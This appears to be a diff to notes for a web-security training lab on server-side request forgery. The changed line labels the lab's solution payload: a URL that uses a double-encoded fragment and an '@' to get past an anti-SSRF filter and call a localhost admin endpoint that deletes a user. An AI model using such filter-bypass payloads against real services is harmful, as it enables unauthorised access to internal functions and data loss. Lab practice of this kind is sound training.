@@ -10,4 +10,4 @@ To solve the lab, change the stock check URL to access the admin interface at ht
 The developer has deployed an anti-SSRF defense you will need to bypass.
 
 
-// http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+//exploit : http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
